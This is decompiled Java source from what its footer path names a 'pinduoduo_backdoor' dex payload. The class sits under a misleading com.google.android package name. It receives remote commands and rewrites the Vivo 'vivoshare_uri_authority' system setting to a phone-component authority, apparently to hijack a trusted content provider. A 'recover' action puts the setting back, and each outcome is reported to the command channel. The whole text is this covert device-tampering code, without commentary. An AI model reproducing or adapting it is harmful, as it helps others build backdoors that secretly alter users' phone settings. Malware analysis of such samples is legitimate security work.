package com.google.android.sd.biz_dynamic_dex.vivo_browser_settings;

import android.content.Context;
import android.provider.Settings;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class VivoBrowserSettingsExecutor extends DynamicCmdExecutor {
  private final int CMD = 35;
  
  private void fail(Context paramContext, String paramString1, String paramString2) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(35, paramString2, "client"), paramString1, null));
  }
  
  private void success(Context paramContext, boolean paramBoolean, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(new CmdData(35, paramString, "client"), null, null));
  }
  
  private void updateVal(Context paramContext, String paramString1, String paramString2) {
    Settings.System.putString(paramContext.getContentResolver(), "vivoshare_uri_authority", paramString1);
    if (TextUtils.equals(Settings.System.getString(paramContext.getContentResolver(), "vivoshare_uri_authority"), paramString1)) {
      success(paramContext, false, paramString2);
      return;
    } 
    fail(paramContext, "write_fail", paramString2);
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    if (TextUtils.isEmpty(paramString))
      return; 
    JSONObject jSONObject = new JSONObject(paramString);
    paramString = jSONObject.optString("uuid");
    String str1 = jSONObject.optString("action", "");
    String str2 = Settings.System.getString(paramContext.getContentResolver(), "vivoshare_uri_authority");
    if (TextUtils.equals(str1, "work")) {
      if (TextUtils.equals(str2, "com.android.phone.upgradeiroaming")) {
        success(paramContext, true, paramString);
        return;
      } 
      if (TextUtils.equals(str2, "vivoshare_uri_authority_default") || TextUtils.isEmpty(str2)) {
        updateVal(paramContext, "com.android.phone.upgradeiroaming", paramString);
        return;
      } 
      fail(paramContext, "not_default_val", paramString);
      return;
    } 
    if (TextUtils.equals(str1, "recover")) {
      if (TextUtils.equals(str2, "vivoshare_uri_authority_default")) {
        success(paramContext, true, paramString);
        return;
      } 
      if (TextUtils.equals(str2, "com.android.phone.upgradeiroaming")) {
        updateVal(paramContext, "vivoshare_uri_authority_default", paramString);
        return;
      } 
      fail(paramContext, "invalid_local_val", paramString);
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\136d4651-df47-41b4-bb80-2ec0ab1bc775-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_browser_settings\VivoBrowserSettingsExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */